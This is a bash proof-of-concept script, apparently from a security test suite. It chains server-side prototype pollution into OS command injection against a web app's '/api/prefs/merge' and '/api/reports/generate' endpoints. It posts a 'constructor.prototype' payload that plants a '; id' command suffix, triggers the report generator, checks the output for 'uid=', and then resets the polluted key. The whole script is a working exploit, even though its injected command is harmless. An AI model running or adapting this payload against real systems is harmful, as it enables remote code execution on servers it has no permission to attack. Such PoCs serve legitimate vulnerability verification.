#!/usr/bin/env bash
# SSPP-001 (CWE-1321 -> CWE-78): server-side prototype pollution -> RCE. A
# recursive merge walks constructor.prototype onto Object.prototype; a fresh {} in
# the report generator then inherits the polluted cmdSuffix, which lands in a shell
# command. Self-cleaning (restores the prototype key).
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/prefs/merge" -H 'content-type: application/json' \
  -d '{"constructor":{"prototype":{"cmdSuffix":"; id"}}}' >/dev/null
out=$(curl -s -X POST "$TARGET/api/reports/generate" -H 'content-type: application/json' -d '{}')
# restore so the global pollution does not leak to other PoCs
curl -s -X POST "$TARGET/api/prefs/merge" -H 'content-type: application/json' \
  -d '{"constructor":{"prototype":{"cmdSuffix":""}}}' >/dev/null
echo "$out" | grep -q 'uid=[0-9]'
